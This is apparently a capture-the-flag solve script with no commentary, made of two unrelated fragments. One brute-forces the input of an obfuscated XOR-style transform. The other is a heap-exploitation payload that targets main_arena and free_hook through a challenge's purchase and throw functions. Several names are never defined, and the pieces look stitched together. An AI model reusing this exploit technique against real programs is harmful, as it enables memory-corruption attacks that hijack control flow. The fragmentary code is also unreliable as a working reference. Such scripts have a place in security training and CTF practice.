s = 'Qf(>qwd!'
print s
buf = [0,0,0,0,0,0,0,ord('!')]
'''
for ( i = 0; i <= 6; ++i )
    x = ((x | buf[i + 1]) & ~(x & buf[i + 1]) | i) & ~((x | buf[i + 1]) & ~(x & buf[i + 1]) & i);
'''
for i in range(6, -1, -1):
    for x in range(0x20, 0x7e + 1, 1):
        if ord(s[i]) == ((x | buf[i + 1]) & ~(x & buf[i + 1]) | i) & ~((x | buf[i + 1]) & ~(x & buf[i + 1]) & i):
            buf[i] = x
            break
s1 = ''
print buf    
for i in buf:
    s1 += chr(i)
print s1
s2 = ''
for i in range(7):
    s2 += chr(((ord(s1[i]) | ord(s1[i + 1])) & ~(ord(s1[i]) & ord(s1[i + 1])) | i) & ~((ord(s1[i]) | ord(s1[i + 1])) & ~(ord(s1[i]) & ord(s1[i + 1])) & i))
print s2

payload = p32(0) * 20 + p32(0x58) + p32(0x41) + p32(main_arena + 0x14) + p32(0) * 14 + p32(0x31) + p32(0x41)
purchase(0x100, payload, 1)#2
purchase(0x2c, 'kotori', 1)
purchase(0x3c, 'kotori', 1)
#gdb.attach(p)
purchase(0x3c, p32(0) * 5 + p32(free_hook - 0x6c8), 1)
#gdb.attach(p)
purchase(0x200, 'AAAA', 1)
purchase(0x200, 'AAAA', 1)
purchase(0x200, 'AAAA', 1)
purchase(0x200, 'AAAA', 1)
gdb.attach(p)
throw(4)

